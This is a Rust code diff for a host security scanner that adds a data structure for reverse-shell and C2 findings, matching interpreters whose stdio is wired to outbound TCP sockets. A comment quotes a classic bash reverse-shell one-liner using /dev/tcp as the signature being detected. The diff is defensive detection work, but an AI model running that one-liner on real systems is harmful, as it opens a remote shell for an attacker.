@@ -287,6 +287,8 @@ pub struct SecurityInfo {
     pub suspicious_processes: Vec<SuspiciousProcess>,
     #[serde(default)]
     pub mount_masking: Vec<MountMaskingFinding>,
+    #[serde(default)]
+    pub reverse_shells: Vec<ReverseShellFinding>,
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -499,4 +501,27 @@ pub struct MountMaskingFinding {
     /// `tmpfs over /var/log`, `bind overlay on /var/log`).
     #[serde(default)]
     pub reason: String,
+}
+
+// Reverse-shell / C2 correlation (SEC-022)
+
+/// An interactive interpreter (bash, python, nc, socat, …) holding an
+/// ESTABLISHED outbound TCP socket to a public remote address, with that
+/// socket wired to one of its stdio fds (0/1/2). This is the signature of a
+/// classic reverse shell (`bash -i >& /dev/tcp/host/port 0>&1`), correlated
+/// from `/proc/net/tcp{,6}` (established) × `/proc/<pid>/fd`.
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct ReverseShellFinding {
+    pub pid: u32,
+    /// Process comm (the interpreter name that matched the shell allowlist).
+    pub process: String,
+    /// Resolved executable path, if readable.
+    #[serde(default)]
+    pub exe_path: Option<String>,
+    /// Remote endpoint the socket is connected to, `ip:port`.
+    pub remote_address: String,
+    /// Which stdio fd carried the socket: 0=stdin, 1=stdout, 2=stderr.
+    /// None = socket held on a non-stdio fd (weaker, still reported).
+    #[serde(default)]
+    pub stdio_fd: Option<u8>,
 }
